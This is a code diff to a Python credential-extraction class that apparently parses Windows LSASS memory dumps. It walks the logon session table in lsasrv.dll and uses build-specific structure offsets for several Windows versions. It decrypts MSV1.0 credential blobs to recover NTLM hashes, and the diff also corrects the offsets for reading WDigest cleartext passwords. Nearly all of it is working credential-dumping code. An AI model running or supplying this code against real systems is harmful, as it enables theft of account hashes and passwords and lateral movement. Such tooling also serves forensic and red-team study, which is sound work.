@@ -321,48 +321,170 @@ class CredentialExtractor:
     def _extract_msv(self) -> list[Credential]:
         """Extract MSV1.0 credentials (NTLM hashes).
 
-        For build >= 26000 (Win11 24H2): find logon session table via signature
-        in lsasrv.dll, walk entries, follow credential chain, decrypt.
-        For older builds: use traditional pattern matching.
+        Uses the lsasrv.dll logon session hash table for all builds.
+        Build >= 26000 (24H2): specific signature + 24H2 offsets.
+        Build < 26000: LEA scanning + build-appropriate offsets.
         """
         if self._build >= 26000:
             return self._extract_msv_24h2()
+        return self._extract_msv_via_sessions()
+
+    def _find_session_table_via_lea(self, lsasrv) -> tuple[int, int] | None:
+        """Find the logon session hash table by scanning lsasrv.dll for
+        LEA instructions in .text that reference .data, validating each target.
+        Returns (table_addr, nbuckets) or None."""
+        lsasrv_data = self.dump.read_memory(lsasrv.base_address, lsasrv.size)
+        if not lsasrv_data or len(lsasrv_data) < 0x3E:
+            return None
+
+        pe_off = struct.unpack_from("<I", lsasrv_data, 0x3C)[0]
+        if pe_off + 24 > len(lsasrv_data):
+            return None
+        nsections = struct.unpack_from("<H", lsasrv_data, pe_off + 6)[0]
+        opt_sz = struct.unpack_from("<H", lsasrv_data, pe_off + 20)[0]
+        sec_off = pe_off + 24 + opt_sz
+
+        text_va = text_sz = data_va = data_sz = 0
+        for i in range(nsections):
+            off = sec_off + i * 40
+            if off + 40 > len(lsasrv_data):
+                break
+            name = lsasrv_data[off:off + 8].rstrip(b'\x00')
+            if name == b'.text':
+                text_sz = struct.unpack_from("<I", lsasrv_data, off + 8)[0]
+                text_va = struct.unpack_from("<I", lsasrv_data, off + 12)[0]
+            elif name == b'.data':
+                data_sz = struct.unpack_from("<I", lsasrv_data, off + 8)[0]
+                data_va = struct.unpack_from("<I", lsasrv_data, off + 12)[0]
+
+        if not text_va or not data_va:
+            return None
+
+        data_abs = lsasrv.base_address + data_va
+        data_end = data_abs + data_sz
+
+        seen = set()
+        for i in range(text_va, min(text_va + text_sz - 7, len(lsasrv_data) - 7)):
+            if lsasrv_data[i] in (0x48, 0x4C) and lsasrv_data[i + 1] == 0x8D:
+                modrm = lsasrv_data[i + 2]
+                if modrm & 0xC7 == 0x05:
+                    disp = struct.unpack_from("<i", lsasrv_data, i + 3)[0]
+                    target = lsasrv.base_address + i + 7 + disp
+                    if data_abs <= target < data_end and target not in seen:
+                        seen.add(target)
+                        nb = self._validate_session_table(target)
+                        if nb:
+                            return (target, nb)
+
+        return None
+
+    def _validate_session_table(self, table_addr: int) -> int:
+        """Check if addr looks like a LIST_ENTRY hash table.
+        Returns the bucket count (32/64) if valid, 0 otherwise.
+        Empty buckets may be self-referencing or null-initialized."""
+        for nbuckets in (64, 32):
+            empty = 0
+            valid = 0
+            bad = False
+            for bucket in range(nbuckets):
+                ba = table_addr + bucket * 16
+                data = self.dump.read_memory(ba, 16)
+                if not data:
+                    bad = True
+                    break
+                flink = struct.unpack_from("<Q", data, 0)[0]
+                blink = struct.unpack_from("<Q", data, 8)[0]
+                if (flink == ba and blink == ba) or (flink == 0 and blink == 0):
+                    empty += 1
+                elif 0x100000 < flink < 0x7FFFFFFFFFFF:
+                    valid += 1
+                else:
+                    bad = True
+                    break
+            if not bad and empty >= nbuckets // 2 and valid >= 1:
+                return nbuckets
+        return 0
+
+    def _extract_msv_via_sessions(self) -> list[Credential]:
+        """Extract MSV credentials via lsasrv.dll logon session table (all pre-24H2 builds)."""
+        lsasrv = self.dump.find_module("lsasrv")
+        if not lsasrv:
+            return []
+
+        result = self._find_session_table_via_lea(lsasrv)
+        if result is None:
+            return []
+        table_addr, nbuckets = result
 
         credentials = []
-        msv = self.dump.find_module("msv1_0")
-        if not msv:
-            return credentials
-
-        pattern = self._get_msv_pattern()
-        if not pattern:
-            return credentials
-
-        results = self.dump.search_memory(pattern)
-        for addr in results:
-            if not (msv.base_address <= addr < msv.base_address + msv.size):
-                continue
-            creds = self._walk_msv_list(addr)
-            credentials.extend(creds)
-            if creds:
+        for bucket in range(nbuckets):
+            bucket_addr = table_addr + bucket * 16
+            bucket_data = self.dump.read_memory(bucket_addr, 16)
+            if not bucket_data:
                 break
-        return credentials
+            flink = struct.unpack_from("<Q", bucket_data, 0)[0]
+            if flink == 0 or flink == bucket_addr:
+                continue
+
+            current = flink
+            visited = set()
+            while current not in visited and current != 0 and current != bucket_addr:
+                visited.add(current)
+                cred = self._parse_logon_session(current)
+                if cred:
+                    credentials.append(cred)
+                next_ptr = self.dump.read_ptr(current)
+                if not next_ptr:
+                    break
+                current = next_ptr
+
+        seen = set()
+        unique = []
+        for c in credentials:
+            key = (c.username, c.domain, c.ntlm_hash)
+            if key not in seen:
+                seen.add(key)
+                unique.append(c)
+        return unique
+
+    def _get_session_offsets(self) -> tuple[int, int, int]:
+        """Return (username, domain, credentials_ptr) offsets based on build.
+
+        Structures: KIWI_MSV1_0_LIST_6x (x64).
+        """
+        if self._build >= 9600:
+            return (0x90, 0xA0, 0x108)
+        if self._build >= 9200:
+            return (0x78, 0x88, 0xF0)
+        return (0x68, 0x78, 0xD8)
+
+    def _parse_logon_session(self, addr: int) -> Credential | None:
+        """Parse a logon session entry (all pre-24H2 builds)."""
+        uname_off, dom_off, cred_off = self._get_session_offsets()
+        read_sz = cred_off + 8
+
+        entry = self.dump.read_memory(addr, read_sz)
+        if not entry:
+            return None
+
+        username = self._read_unicode_string_from(entry, uname_off)
+        domain = self._read_unicode_string_from(entry, dom_off)
+        if not username:
+            return None
+
+        creds_ptr = struct.unpack_from("<Q", entry, cred_off)[0]
+        if creds_ptr == 0:
+            return None
+
+        return self._follow_cred_chain(creds_ptr, username, domain, is_24h2=False)
 
     def _extract_msv_24h2(self) -> list[Credential]:
-        """Extract MSV credentials for Win11 24H2 (build 26000+).
-
-        1. Find signature in lsasrv.dll code
-        2. Resolve the logon session hash table address
-        3. Walk non-empty buckets
-        4. For each session: follow Credentials_list_ptr -> PrimaryCredentials
-        5. Decrypt encrypted_credentials blob with LSA keys
-        6. Parse decrypted data for NtOwfPassword
-        """
+        """Extract MSV credentials for Win11 24H2 (build 26000+)."""
         credentials = []
         lsasrv = self.dump.find_module("lsasrv")
         if not lsasrv:
             return credentials
 
-        # Signature for Win11 24H2+
         sig = b"\x45\x89\x34\x24\x8b\xfb\x45\x85\xc0\x0f"
         hits = self.dump.search_memory(sig)
         sig_addr = None
@@ -373,22 +495,16 @@ class CredentialExtractor:
         if sig_addr is None:
             return credentials
 
-        # Resolve table address using RIP-relative addressing:
-        # LEA r13, [rip+disp1]  at sig+0x16 → lsasrv_base
-        # LEA rdx, [r13+disp2] at sig+0x1F → table_base
-        # disp1 at sig+0x19 (4 bytes signed), disp2 at sig+0x22 (4 bytes signed)
         ctx = self.dump.read_memory(sig_addr, 48)
         if not ctx:
             return credentials
 
         disp1 = struct.unpack_from("<i", ctx, 0x19)[0]
-        base_addr = sig_addr + 0x19 + 4 + disp1  # RIP-relative resolution
+        base_addr = sig_addr + 0x19 + 4 + disp1
 
         disp2 = struct.unpack_from("<i", ctx, 0x22)[0]
         table_addr = base_addr + disp2
 
-        # Walk all buckets in the hash table (count from offset2)
-        # Read up to 64 buckets, each 16 bytes (LIST_ENTRY)
         for bucket in range(64):
             bucket_addr = table_addr + bucket * 16
             bucket_data = self.dump.read_memory(bucket_addr, 16)
@@ -398,7 +514,6 @@ class CredentialExtractor:
             if flink == 0 or flink == bucket_addr:
                 continue
 
-            # Walk linked list in this bucket
             current = flink
             visited = set()
             while current not in visited and current != 0 and current != bucket_addr:
@@ -411,7 +526,6 @@ class CredentialExtractor:
                     break
                 current = next_ptr
 
-        # Deduplicate
         seen = set()
         unique = []
         for c in credentials:
@@ -424,12 +538,7 @@ class CredentialExtractor:
     def _parse_logon_session_24h2(self, addr: int) -> Credential | None:
         """Parse a KIWI_MSV1_0_LIST_65 logon session entry (Win11 24H2).
 
-        Key offsets:
-        +0x70: LUID (8 bytes)
-        +0xA0: UserName (UNICODE_STRING, 16 bytes)
-        +0xB0: Domaine (UNICODE_STRING, 16 bytes)
-        +0xE8: LogonType (ULONG, 4 bytes)
-        +0x118: Credentials_list_ptr (POINTER, 8 bytes)
+        +0xA0: UserName, +0xB0: Domaine, +0x118: Credentials_list_ptr
         """
         entry = self.dump.read_memory(addr, 0x120)
         if not entry:
@@ -444,8 +553,19 @@ class CredentialExtractor:
         if creds_ptr == 0:
             return None
 
-        # Follow: Credentials_list_ptr → KIWI_MSV1_0_CREDENTIAL_LIST
-        # +0: Flink (8), +8: AuthPkgId (4) + pad (4), +16: PrimaryCredentials_ptr (8)
+        return self._follow_cred_chain(creds_ptr, username, domain, is_24h2=True)
+
+    def _follow_cred_chain(self, creds_ptr: int, username: str, domain: str,
+                           is_24h2: bool) -> Credential | None:
+        """Follow the credential chain from a logon session to the NTLM hash.
+
+        Credential chain (same across builds):
+        Credentials_list_ptr → KIWI_MSV1_0_CREDENTIAL_LIST
+          +0: Flink (8), +16: PrimaryCredentials_ptr (8)
+        PrimaryCredentials_ptr → KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC
+          +0: Flink (8), +8: Primary ANSI_STRING (16)
+          +24: encrypted_credentials UNICODE_STRING (Length(2)+MaxLen(2)+pad(4)+Buffer(8))
+        """
         cred_list = self.dump.read_memory(creds_ptr, 24)
         if not cred_list:
             return None
@@ -453,8 +573,6 @@ class CredentialExtractor:
         if prim_ptr == 0:
             return None
 
-        # Follow: PrimaryCredentials_ptr → KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC
-        # +0: Flink (8), +8: Primary ANSI_STRING (16), +24: encrypted_credentials (16)
         prim = self.dump.read_memory(prim_ptr, 40)
         if not prim:
             return None
@@ -463,34 +581,74 @@ class CredentialExtractor:
         if enc_len == 0 or enc_ptr == 0:
             return None
 
-        # Read and decrypt the credential blob
         encrypted = self.dump.read_memory(enc_ptr, enc_len)
         if not encrypted:
             return None
         decrypted = self._lsa_decrypt(encrypted)
-        if not decrypted or len(decrypted) < 86:
+        if not decrypted:
             return None
 
-        # Parse MSV1_0_PRIMARY_CREDENTIAL_11_H24_DEC (no credKeyType field):
-        # +40: isIso (1), +41: isNtOwfPassword (1)
-        # +48: isoSize (2)
-        # +50: DPAPIProtected (20)
-        # +70: NtOwfPassword (16)
-        # +86: LmOwfPassword (16)
+        if is_24h2:
+            return self._parse_decrypted_cred_24h2(decrypted, username, domain)
+        return self._parse_decrypted_cred(decrypted, username, domain)
+
+    def _parse_decrypted_cred(self, decrypted: bytes, username: str,
+                              domain: str) -> Credential | None:
+        """Parse decrypted MSV1_0_PRIMARY_CREDENTIAL (pre-24H2).
+
+        Three variants by build:
+        1) Pre-Win10 (< 10240):
+           +0x20: NtOwfPassword[16], +0x54: isNtOwfPassword
+        2) Win10 1507/1511 (10240-10585):
+           +0x21: isNtOwfPassword, +0x28: NtOwfPassword[16]
+        3) Win10 1607+ (>= 14393, includes Server 2016/2019/2022):
+           +0x29: isNtOwfPassword, +0x4A: NtOwfPassword[16]
+        """
+        if self._build >= 14393:
+            if len(decrypted) < 0x5A:
+                return None
+            is_nt = decrypted[0x29]
+            nt_off = 0x4A
+        elif self._build >= 10240:
+            if len(decrypted) < 0x38:
+                return None
+            is_nt = decrypted[0x21]
+            nt_off = 0x28
+        else:
+            if len(decrypted) < 0x55:
+                return None
+            is_nt = decrypted[0x54]
+            nt_off = 0x20
+
+        if not is_nt:
+            return None
+        nt_hash = decrypted[nt_off:nt_off + 16]
+        if nt_hash == b"\x00" * 16:
+            return None
+        return Credential(
+            username=username, domain=domain,
+            auth_type="msv1_0", ntlm_hash=nt_hash.hex(),
+        )
+
+    def _parse_decrypted_cred_24h2(self, decrypted: bytes, username: str,
+                                    domain: str) -> Credential | None:
+        """Parse decrypted MSV1_0_PRIMARY_CREDENTIAL (Win11 24H2).
+
+        +40: isIso (1), +41: isNtOwfPassword (1)
+        +70: NtOwfPassword (16)
+        """
+        if len(decrypted) < 86:
+            return None
         is_iso = decrypted[40]
         is_nt = decrypted[41]
         if is_iso or not is_nt:
             return None
-
         nt_hash = decrypted[70:86]
         if nt_hash == b"\x00" * 16:
             return None
-
         return Credential(
-            username=username,
-            domain=domain,
-            auth_type="msv1_0",
-            ntlm_hash=nt_hash.hex(),
+            username=username, domain=domain,
+            auth_type="msv1_0", ntlm_hash=nt_hash.hex(),
         )
 
     def _read_unicode_string_from(self, buf: bytes, offset: int) -> str:
@@ -499,102 +657,12 @@ class CredentialExtractor:
             return ""
         length = struct.unpack_from("<H", buf, offset)[0]
         ptr = struct.unpack_from("<Q", buf, offset + 8)[0]
-        if length == 0 or ptr == 0:
+        if length == 0 or ptr == 0 or length > 512:
             return ""
         raw = self.dump.read_memory(ptr, length)
         if not raw:
             return ""
         return raw.decode("utf-16-le", errors="replace")
-
-    def _get_msv_pattern(self) -> bytes | None:
-        """Get the pattern to find MSV credential list based on build."""
-        if self._build >= 19041:
-            return b"\x45\x89\x34\x24\x4c\x8b"
-        elif self._build >= 17763:
-            return b"\x48\x8b\x18\x48\x8d\x0d"
-        return b"\x33\xff\x41\x89\x7c\x24"
-
-    def _walk_msv_list(self, pattern_addr: int) -> list[Credential]:
-        """Walk the MSV1.0 credential linked list from a pattern match."""
-        credentials = []
-
-        # The list head is referenced by a RIP-relative offset near the pattern
-        # Read the offset (usually 6 bytes after pattern start)
-        ref = self.dump.read_u32(pattern_addr + 6)
-        if ref is None:
-            return credentials
-
-        list_head = pattern_addr + 6 + 4 + ref
-        first_entry = self.dump.read_ptr(list_head)
-
-        if not first_entry or first_entry == list_head:
-            return credentials
-
-        # Walk the list (max 256 entries to avoid infinite loops)
-        current = first_entry
-        visited = set()
-
-        for _ in range(256):
-            if current in visited or current == 0 or current == list_head:
-                break
-            visited.add(current)
-
-            cred = self._parse_msv_entry(current)
-            if cred:
-                credentials.append(cred)
-
-            # Next entry (Flink is at offset 0)
-            next_ptr = self.dump.read_ptr(current)
-            if not next_ptr:
-                break
-            current = next_ptr
-
-        return credentials
-
-    def _parse_msv_entry(self, addr: int) -> Credential | None:
-        """Parse a single MSV1.0 credential entry.
-
-        The structure layout depends on the Windows build.
-        Key fields: username, domain, encrypted NT hash, encrypted LM hash.
-        """
-        # Offsets for modern Windows 10 builds (19041+)
-        # These are offsets within the KIWI_MSV1_0_LIST structure
-        if self._build >= 19041:
-            username_offset = 0x90
-            domain_offset = 0x80
-            encrypted_nt_offset = 0xA8
-        elif self._build >= 17763:
-            username_offset = 0x90
-            domain_offset = 0x80
-            encrypted_nt_offset = 0xA8
-        else:
-            username_offset = 0x78
-            domain_offset = 0x68
-            encrypted_nt_offset = 0x90
-
-        # Read UNICODE_STRING for username: Length(2) + MaxLength(2) + padding(4) + Buffer(8)
-        username = self._read_unicode_string(addr + username_offset)
-        domain = self._read_unicode_string(addr + domain_offset)
-
-        if not username:
-            return None
-
-        # Read encrypted credentials sub-structure
-        # The NT hash is 16 bytes, encrypted
-        encrypted_nt = self.dump.read_memory(addr + encrypted_nt_offset, 16)
-        if not encrypted_nt or encrypted_nt == b"\x00" * 16:
-            return None
-
-        # Decrypt
-        nt_hash_raw = self._lsa_decrypt(encrypted_nt)
-        nt_hash = nt_hash_raw[:16].hex() if nt_hash_raw else ""
-
-        return Credential(
-            username=username,
-            domain=domain,
-            auth_type="msv1_0",
-            ntlm_hash=nt_hash,
-        )
 
     def _extract_wdigest(self) -> list[Credential]:
         """Extract WDigest credentials (cleartext passwords).
@@ -646,11 +714,12 @@ class CredentialExtractor:
                 break
             visited.add(current)
 
-            # WDigest entry: Flink(8) + Blink(8) + UsageCount(4) + pad(4)
-            # + Username UNICODE_STRING + Domain UNICODE_STRING + Password UNICODE_STRING
+            # KIWI_WDIGEST_LIST_ENTRY (x64):
+            # +0x00 Flink/Blink(16) +0x10 UsageCount(4)+pad(4) +0x18 This(8)
+            # +0x20 LUID(8) +0x28 pad(8) +0x30 UserName(16) +0x40 Domaine(16) +0x50 Password(16)
             username = self._read_unicode_string(current + 0x30)
-            domain = self._read_unicode_string(current + 0x20)
-            encrypted_pw = self._read_unicode_string_raw(current + 0x40)
+            domain = self._read_unicode_string(current + 0x40)
+            encrypted_pw = self._read_unicode_string_raw(current + 0x50)
 
             if username and encrypted_pw:
                 decrypted = self._lsa_decrypt(encrypted_pw)
